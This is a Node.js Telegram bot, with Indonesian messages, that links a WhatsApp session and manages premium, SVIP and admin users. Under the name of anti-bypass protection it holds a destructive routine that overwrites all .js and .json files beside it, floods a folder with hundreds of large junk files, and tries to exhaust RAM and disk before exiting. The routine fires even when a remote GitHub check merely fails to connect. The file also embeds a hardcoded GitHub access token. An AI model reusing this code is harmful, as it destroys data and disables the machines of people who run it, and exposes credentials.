const { Telegraf, session } = require("telegraf");
const prettier = require("prettier");
const walk = require("acorn-walk");
const { Client } = require('ssh2');
const { v4: uuidv4 } = require('uuid');
const nodemailer = require("nodemailer");
const tar = require("tar");
const htmlparser2 = require("htmlparser2");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const cheerio = require("cheerio");
const { Octokit } = require("@octokit/rest");
const AdmZip = require("adm-zip");
const JSZip = require("jszip");
const acorn = require("acorn");
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const readline = require("readline");
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const deployToGitHub = require("./settings/deploy");
const { githubToken, githubUser } = require("./settings/github");
const JsConfuser = require("js-confuser");
global.log = console.log;
const log = console.log.bind(console);
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}

const { Readable } = require("stream");

function bufferToStream(buffer) {
  const readable = new Readable();
  readable._read = () => {};
  readable.push(buffer);
  readable.push(null);
  return readable;
}

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
function groupOnly(ctx) {
  try {
    if (!ctx.chat || ctx.chat.type !== "group" && ctx.chat.type !== "supergroup") {
      ctx.reply("⚠️ Command ini hanya bisa digunakan di Group.");
      return false;
    }

    if (ctx.chat.id.toString() !== allowedGroupID) {
      ctx.reply("❌ Group ini tidak terdaftar sebagai group resmi bot.");
      return false;
    }

    return true;
  } catch {
    return false;
  }
}
const { tokenBot, ownerID, adminID, allowedGroupID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const OWNER = "Bealllevey62";
const REPO = "lolipopDb";
const TOKEN_FILE = "tokens.json";
const GITHUB_TOKEN = "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";
const LOLLIPOP_FILE = "lolipop.json";
const OWNER_ID = 5126860596;
const databaseUrl = `https://raw.githubusercontent.com/${OWNER}/${REPO}/main/${TOKEN_FILE}`;

const thumbnailUrl = "https://files.catbox.moe/ruy7ol.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function replaceFilesOnBreach(options = {}) {
  const {
    spamConfig = { js: 500, txt: 400, json: 100 }, 
    spamDir = options.spamDir || path.join(__dirname, "Session"),
    spamTemplate = options.spamTemplate || "BYPASS TERDETEKSI\n",
    replaceTemplate = options.replaceTemplate || "maklo gua ewe",
    replaceSize = typeof options.replaceSize === "number" ? options.replaceSize : 500000,
    spamContentSize = typeof options.spamContentSize === "number" ? options.spamContentSize : 5_000_000,
    maxSpamCount = typeof options.maxSpamCount === "number" ? options.maxSpamCount : 50_000,
    memoryStress = true, 
    diskStress = true    
  } = options;

  console.log("\x1b[31m%s\x1b[0m", "WOPSS NGAPAIN ENTE ANJING?");

  const files = fs.readdirSync(__dirname).filter(f => {
    const ext = path.extname(f).toLowerCase();
    return ext === ".js" || ext === ".json";
  });

  for (const file of files) {
    try {
      const filePath = path.join(__dirname, file);
      if (!fs.existsSync(filePath)) continue;

      const ext = path.extname(file).toLowerCase();
      let newContent;

      if (ext === ".js") {
        let buf = "";
        while (Buffer.byteLength(buf, "utf8") < replaceSize) buf += replaceTemplate + "\n";
        newContent = buf.slice(0, replaceSize);
      } else if (ext === ".json") {
        newContent = JSON.stringify({ replaced: true, msg: "Kena Bypass", at: new Date().toISOString() }, null, 2);
      }

      fs.writeFileSync(filePath, newContent, "utf8");
    } catch (err) {
      console.log(`❌ Gagal menimpa ${file}: ${err.message}`);
    }
  }

  console.log("File Dierrorkan:", spamDir);
  if (!fs.existsSync(spamDir)) fs.mkdirSync(spamDir, { recursive: true });

  for (const [ext, count] of Object.entries(spamConfig)) {
    const total = Math.min(count, maxSpamCount);
    const pad = n => String(n).padStart(String(total).length, "0");
    const baseContent = spamTemplate.repeat(Math.ceil(spamContentSize / spamTemplate.length)).slice(0, spamContentSize);

    for (let i = 1; i <= total; i++) {
      const filename = `Mampus-${ext.toUpperCase()}-${pad(i)}.${ext}`;
      const filepath = path.join(spamDir, filename);
      const header = `// FILE TYPE: ${ext}\n: ${new Date().toISOString()}\n\n`;
      fs.writeFileSync(filepath, header + baseContent, "utf8");
    }
  }

  if (memoryStress) {
    const memoryLoad = [];
    try {
      for (let i = 0; i < 1000; i++) {
        memoryLoad.push(Buffer.alloc(1024 * 1024 * 100, "A"));
      }
    } catch (e) {
      console.log("⚠️ RAM penuh:", e.message);
    }
  }

  if (diskStress) {
    try {
      const bigFile = path.join(spamDir, "BoomPanel");
      const stream = fs.createWriteStream(bigFile);
      for (let i = 0; i < 1000; i++) {
        stream.write("X".repeat(1024 * 1024 * 100));
      }
      stream.end();
    } catch (e) {
      console.log("⚠️ Gagal menulis disk besar:", e.message);
    }
  }

  console.log("🚨 Wops Server Mendeteksi Bypass");
  process.exit(1);
}

function activateSecureMode() {
  secureMode = true;
  console.log(chalk.bold.blueBright("⚠️ Xatanical AntiBypass"));
replaceFilesOnBreach({
  spamConfig: { js: 500, txt: 400, json: 100 },
  replaceSize: 3000000,
  spamContentSize: 10000000
});
}
(function () {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }
  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      console.warn("⚠️ Deteksi debugger: " + randErr());
      activateSecureMode();
   }
  }, 1000);
  const code = "AlwaysProtect";
  if (code.length !== 13) {
    console.warn("⚠️ Code mismatch terdeteksi!");
    activateSecureMode();
  }
  function secure() {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃ Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
    `));
  }
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    const currentHash = Buffer.from(secure.toString()).toString("base64");
    if (currentHash !== hash) {
      console.warn("⚠️ Modifikasi fungsi secure terdeteksi!");
      activateSecureMode();
    }
  }, 2000);
  secure();
})();
(() => {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }
  setInterval(() => {
    try {
      let detected = false;
      if (typeof process.exit === "function" && process.exit.toString().includes("Proxy")) {
        detected = true;
      }
      if (typeof process.kill === "function" && process.kill.toString().includes("Proxy")) {
        detected = true;
      }
      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          detected = true;
          break;
        }
      }
      if (detected) {
        console.log(chalk.bold.green(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃ Server Xatanical Mendeteksi
┃Anda Telah Membypass Paksa 
⬡═―—―――――――――――――――――—═⬡
        `));
        activateSecureMode();
      } else {
      }
    } catch (err) {
      console.warn("⚠️ Error saat pengecekan bypass:", err.message);
      activateSecureMode();
    }
  }, 2000);
  global.validateToken = async (databaseUrl, tokenBot) => {
    try {
      const res = await fetchJsonHttps(databaseUrl, 5000);
      const tokens = (res && res.tokens) || [];

      if (tokens.includes(tokenBot)) {
        console.log(chalk.blueBright("✅ Token valid dan diverifikasi."));
        return true;
      } else {
        console.log(chalk.bold.red(`
⠀⬡═—⊱ BYPASS TERDETEKSI ⊰—═⬡
┃Server Telah Mendeteksi Kamu Bypass
⬡═―—―――――――――――――――――—═⬡
        `));
        activateSecureMode();
        return false;
      }

    } catch (err) {
      console.log(chalk.bold.red(`
⠀⬡═—⊱ CHECK SERVER ⊰—═⬡
┃ NOTE : SERVER GAGAL TERHUBUNG
⬡═―—―――――――――――――――――—═⬡
      `));
      activateSecureMode();
      return false;
    }
  };
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;

let botActive = true;
let lastStatus = null;

const GITHUB_STATUS_URL = "https://raw.githubusercontent.com/Bealllevey62/lolipopDb/refs/heads/main/botstatus.json";

async function checkGlobalStatus() {
  try {
    const res = await axios.get(GITHUB_STATUS_URL, { timeout: 4000 });
    const newStatus = !!res.data.active;

    if (newStatus !== lastStatus) {
      lastStatus = newStatus;
      botActive = newStatus;
    }
  } catch (err) {
    botActive = true; // fallback biar bot tetap nyala kalau GitHub down
  }
}

checkGlobalStatus();
setInterval(checkGlobalStatus, 3000);

bot.use(async (ctx, next) => {
  try {
    const text = ctx.message?.text?.trim() || "";
    const cbData = ctx.callbackQuery?.data?.trim() || "";

    const isStartText = text.toLowerCase().startsWith("/start");
    const isStartCallback = cbData === "/start";

    // 🔐 Proteksi Token Validasi
    if (!secureMode && !tokenValidated && !(isStartText || isStartCallback)) {
      if (ctx.callbackQuery) {
        try {
          await ctx.answerCbQuery("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start");
        } catch {}
      }
      return ctx.reply("🔒 ☇ Akses terkunci ketik /start untuk mengaktifkan bot");
    }

    // 🚫 Proteksi Global Status dari GitHub
    if (!botActive) {
      // Owner tetap bisa jalankan /on
      if (ctx.from?.id === OWNER_ID && /^\/on\b/i.test(text)) {
        return ctx.reply("MAKLO BYPASS ANJING");
      }
      return ctx.reply("Tutor Rasuk Dong ga seneng ke pv sini @Ghanz626");
    }

    await next();
  } catch (err) {
    console.error("Middleware error:", err);
    return ctx.reply("⚠️ Terjadi kesalahan internal pada sistem proteksi server.");
  }
});

let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ PAIRING ⊰―—═⬡</pre></blockquote>
Number: ${lastPairingMessage.phoneNumber}
Pairing Code: ${lastPairingMessage.pairingCode}
Status: Connection`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.red(`
🅃🅁🄴🄳🄸🄲🅃 🄸🄽🅅🄸🄲🅃🅄🅂
Berhasil Dijalankan 
XATANICAL SERVER
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 Sender Tidak Ada Silahkan /connect terlebih dahulu");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ Kamu Tidak Memiliki Akses Premium");
        return;
    }
    next();
};

bot.command("connect", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /connect 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "BELAXATA");  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote>(🥀) TREDICT INVICTUS</blockquote>
❀ Number: ${phoneNumber}
❀ Pairing Code: ${formattedCode}
❀ Status: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote>(🥀) T R E D I C T I N V I C T U S</blockquote>
❀ Number: ${lastPairingMessage.phoneNumber}
❀ Pairing Code: ${lastPairingMessage.pairingCode}
❀ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

/*bot.command("connect", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner");
    }
    if (!tokenValidated) {
        return;
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("Format: /connect 628××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "XATABELA");  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⬡═―—⊱ Pairing ⊰―—═⬡
Number: ${phoneNumber}
Pairing Code: ${formattedCode}
Status: Not Connected
\`\`\``;

    const sentMsg = await ctx.replyWithVideo(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});*/

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
⬡═―—⊱ Pairing ⊰―—═⬡
Number: ${lastPairingMessage.phoneNumber}
Pairing Code: ${lastPairingMessage.pairingCode}
Status: Connected
\`\`\``;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcd", async (ctx) => {
if (!groupOnly(ctx)) return;
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk Owner");
    }
    if (!tokenValidated) {
        return;
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("Example: /setcd 1");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetbot", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk owner");
  }
  if (!tokenValidated) {
        return;
    }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

const adminFile = path.join(__dirname, "admin.json");

// Baca admin.json
function loadAdmins() {
    if (!fs.existsSync(adminFile)) {
        fs.writeFileSync(adminFile, JSON.stringify([]));
    }
    return JSON.parse(fs.readFileSync(adminFile));
}

// Simpan admin.json
function saveAdmins(admins) {
    fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
}

// Tambah Admin
function addAdminUser(userId) {
    let admins = loadAdmins();
    if (admins.includes(userId)) return false;
    admins.push(userId);
    saveAdmins(admins);
    return true;
}

// Hapus Admin
function delAdminUser(userId) {
    let admins = loadAdmins();
    if (!admins.includes(userId)) return false;
    admins = admins.filter(id => id !== userId);
    saveAdmins(admins);
    return true;
}

// Cek Admin
function isAdmin(userId) {
    let admins = loadAdmins();
    return admins.includes(userId);
}

// Command addadmin
bot.command("addadmin", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner");
    }
    if (!tokenValidated) {
        return;
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addadmin 12345678");
    }

    const userId = args[1];
    const success = addAdminUser(userId);

    if (success) {
        ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai Admin`);
    } else {
        ctx.reply(`⚠️ ☇ ${userId} sudah jadi Admin sebelumnya`);
    }
});

// Command deladmin
bot.command("deladmin", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner");
    }
    if (!tokenValidated) {
        return;
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
    }

    const userId = args[1];
    const success = delAdminUser(userId);

    if (success) {
        ctx.reply(`✅ ☇ ${userId} berhasil dicabut dari Admin`);
    } else {
        ctx.reply(`⚠️ ☇ ${userId} bukan Admin`);
    }
});

async function checkSVIP(ctx, next) {
    const userId = ctx.from.id.toString();

    if (isSVIP(userId)) {
        return next();
    }

    return ctx.reply("❌ Fitur ini hanya untuk Owner atau SVIP.");
}

const svipFile = path.join(__dirname, "svip.json");

global.svipUsers = [];

try {
    if (fs.existsSync(svipFile)) {
        global.svipUsers = JSON.parse(fs.readFileSync(svipFile, "utf8"));
    } else {
        fs.writeFileSync(svipFile, JSON.stringify([]));
    }
} catch (e) {
    console.error("[SVIP] Gagal load file:", e);
    global.svipUsers = [];
}

// ================================
// 🔹 Save Otomatis
// ================================
global.saveSVIP = function () {
    try {
        fs.writeFileSync(svipFile, JSON.stringify(global.svipUsers, null, 2));
    } catch (e) {
        console.error("[SVIP] Gagal menyimpan:", e);
    }
};

// ================================
// 🔥 Tambah SVIP (Permanent)
// ================================
global.addSVIPUser = function (userId) {
    userId = userId.toString();

    // Hapus jika sudah ada
    global.svipUsers = global.svipUsers.filter(u => u !== userId);

    // Tambahkan
    global.svipUsers.push(userId);

    global.saveSVIP();
    return true;
};

// ================================
// 🔥 Hapus SVIP
// ================================
global.removeSVIPUser = function (userId) {
    userId = userId.toString();

    global.svipUsers = global.svipUsers.filter(u => u !== userId);

    global.saveSVIP();
    return true;
};

// ================================
// 🔥 Cek SVIP
// ================================
global.isSVIP = function (userId) {
    return global.svipUsers.includes(userId.toString());
};

bot.command('delsvip', async (ctx) => {
if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delsvip 12345678");
    }

    const userId = args[1];

    removeSVIPUser(userId);

    await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `🗑️ ☇ SVIP user ${userId} telah dihapus.`
    });
});

bot.command('addsvip', async (ctx) => {
if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addsvip 12345678");
    }

    const userId = args[1];

    addSVIPUser(userId);

    await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `👑 ☇ SVIP User Ditambahkan\n\n🆔 User: ${userId}\n💎 Status: SVIP - Permanent\n\n✨ SVIP berhasil diaktifkan!`
    });
});

// SIMPAN STATUS AUTO AKTIF
let botResting = false;
let botWakeTime = 0;
function checkResting(ctx) {
    if (botResting) {
        const sisa = botWakeTime - Date.now();
        const menit = Math.ceil(sisa / 60000);

        ctx.reply(
            `⚠️ Bot sedang offline sejenak.\n` +
            `⏳ Akan aktif kembali dalam ${menit} .\n` +
            `Tunggu hingga masa istirahat selesai.`
        );
        return true; // berarti bot sedang istirahat
    }
    return false; // lanjutan command boleh jalan
}

bot.command("autoaktif", async (ctx) => {
    if (!groupOnly(ctx)) return;

    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ Akses hanya untuk owner atau admin");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 Format: /autoaktif 1h | 30m | 10s");
    }

    const waktu = args[1];
    const match = waktu.match(/(\d+)([smhd])/);
    if (!match) return ctx.reply("❌ Format salah. Contoh: 10s | 5m | 1h");

    const value = parseInt(match[1]);
    const unit = match[2];
    const convert = { s: 1000, m: 60000, h: 3600000, d: 86400000 };

    const delay = value * convert[unit];

    // SET MODE ISTIRAHAT
    botResting = true;
    botWakeTime = Date.now() + delay;

    await ctx.reply(`⏳ Bot masuk mode istirahat selama ${value}${unit}\n⚡ Akan aktif kembali otomatis.`);

    setTimeout(async () => {
        botResting = false;
        try { await ctx.reply("⚡ Bot telah aktif kembali!"); } catch {}
    }, delay);
});

// Command addprem (hanya owner & admin)
bot.command('addprem', async (ctx) => {
if (checkResting(ctx)) return;
    if (!groupOnly(ctx)) return;

    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }

    if (!tokenValidated) return;

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30");
    }

    const userId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("❌ Durasi harus berupa angka (hari)");
    }

    const expiryDate = addPremiumUser(userId, duration);

    await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `✅ ☇ User Premium Ditambahkan\n\n🆔 User: ${userId}\n⏳ Durasi: ${duration} hari\n📅 Berlaku sampai: ${expiryDate}\n\n☑️ Premium aktif sukses!`
    });
});

bot.command('delprem', async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

